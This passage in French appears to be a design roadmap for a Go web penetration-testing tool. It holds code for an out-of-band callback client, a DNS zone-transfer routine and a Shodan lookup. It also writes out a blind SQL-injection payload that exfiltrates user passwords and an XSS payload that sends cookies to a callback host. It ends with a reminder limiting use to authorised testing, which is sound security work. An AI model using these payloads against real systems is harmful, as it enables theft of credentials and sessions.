    // URL unique à injecter dans les payloads SSRF/XXE/blind SQLi
    return fmt.Sprintf("http://%s.%s", o.uniqueID, o.serverURL)
}

func (o *RemoteOOBClient) PollCallbacks(ctx context.Context) []OOBRequest {
    resp, _ := http.Get(o.pollURL)
    // Parser les interactions reçues
    var results []OOBRequest
    json.NewDecoder(resp.Body).Decode(&results)
    return results
}
```

### Usage dans les payloads blind

```go
// Blind SQLi avec OOB — fonctionne même sans erreurs visibles
oobURL := oob.CallbackURL()

blindPayload := fmt.Sprintf(
    "' AND LOAD_FILE(CONCAT('\\\\\\\\', (%s), '.%s\\\\a'))--",
    "SELECT password FROM users LIMIT 1",
    oobURL,
)

// Blind SSRF detection
ssrfPayload := oobURL + "/test"

// Blind XSS avec exfiltration de cookies
xssPayload := fmt.Sprintf(
    `"><script>fetch('%s/'+document.cookie)</script>`,
    oobURL,
)
```

---

## 13. Recon avancé

### Shodan / Censys — surface d'attaque élargie

```go
// internal/hacker/shodan.go — nouveau fichier
// Nécessite: --shodan-key API_KEY

type ShodanAction struct {
    apiKey string
}

func (a *ShodanAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
    domain := extractDomain(target)

    // Shodan API — endpoints ouverts sur l'IP du domaine
    ip := resolveIP(domain)
    url := fmt.Sprintf("https://api.shodan.io/shodan/host/%s?key=%s", ip, a.apiKey)

    resp, _ := client.Do(ctx, &types.Request{Method: "GET", URL: url})

    // Parser les ports ouverts, bannières, CVEs connus
    // Shodan inclut les CVEs détectés automatiquement
    var shodanResult ShodanHostResult
    json.Unmarshal(resp.Body, &shodanResult)

    var findings []Finding
    for _, vuln := range shodanResult.Vulns {
        findings = append(findings, Finding{
            Type:     "shodan_cve",
            Name:     fmt.Sprintf("CVE détecté par Shodan: %s", vuln),
            Severity: SevCritical,
        })
    }
    return ActionResult{Findings: findings}
}
```

### DNS avancé — zone transfer + DNSSEC

```go
// Tenter un transfert de zone DNS (AXFR)
// Souvent oublié sur les DNS internes
func tryZoneTransfer(domain string) []string {
    nameservers, _ := net.LookupNS(domain)
    var records []string
    for _, ns := range nameservers {
        m := new(dns.Msg)
        m.SetAxfr(domain)
        // Transfer complet — expose tous les sous-domaines
        t := new(dns.Transfer)
        env, _ := t.In(m, ns.Host+":53")
        for e := range env {
            for _, rr := range e.RR {
                records = append(records, rr.String())
            }
        }
    }
    return records
}
```

---

## 14. Roadmap priorisée

### P0 — Fixes urgents (1-2 jours)

| Tâche | Fichier | Impact |
|-------|---------|--------|
| Baseline comparison IDOR/Role | `exploit/idor.go`, `exploit/privesc.go` | Éliminer 90% faux positifs |
| Auth propagation (--bearer, --cookie) | `transport/client.go` | Tester surfaces protégées |
| Suivre les 308 dans exploit | `exploit/login.go` | Fix login/register |
| Token placeholder → skip si vide | `exploit/token.go` | Pas de résultat fictif |

### P1 — Nouvelles vulnérabilités (1 semaine)

| Module | Fichier | Criticité |
|--------|---------|-----------|
| SSRF | `hacker/ssrf.go` | Critique — cloud metadata |
| SSTI | `hacker/ssti.go` | Critique — RCE direct |
| XXE | `hacker/xxe.go` | Critique — APIs XML |
| Deep Extract | `hacker/extract_deep.go` | Haute — secrets réels |
| Race Condition | `hacker/race.go` | Haute — bypass logique |

### P2 — Améliorations (2 semaines)

| Module | Fichier | Valeur |
|--------|---------|--------|
| Shell `req` (curl intégré) | `shell/shell.go` | Tests manuels |
| JWT alg confusion + kid injection | `hacker/jwt.go` | Plus de bypasses |
| OAuth misconfigs | `hacker/oauth.go` | Apps modernes |
| OOB distant (interact.sh) | `hacker/oob_remote.go` | Blind detection |
| GraphQL mutations + batch | `hacker/graphql.go` | APIs modernes |

### P3 — Long terme (1 mois)

| Module | Description |
|--------|-------------|
| Shodan/Censys integration | CVEs connus sur l'infrastructure |
| DNS zone transfer | Sous-domaines cachés |
| Deserialization (Java/PHP) | Gadget chains |
| WebSocket testing | Vulns temps réel |
| API versioning abuse | /v1/ vs /v2/ droits différents |
| HTTP Request Smuggling | CL.TE / TE.CL |

---

> **Rappel légal** : Cet outil est exclusivement destiné aux tests de sécurité
> sur des systèmes dont vous êtes propriétaire ou pour lesquels vous disposez
> d'une autorisation écrite explicite. Toute utilisation non autorisée est
> illégale et engage votre responsabilité pénale.
>
> © 2026 NICE-DEV226 — MIT License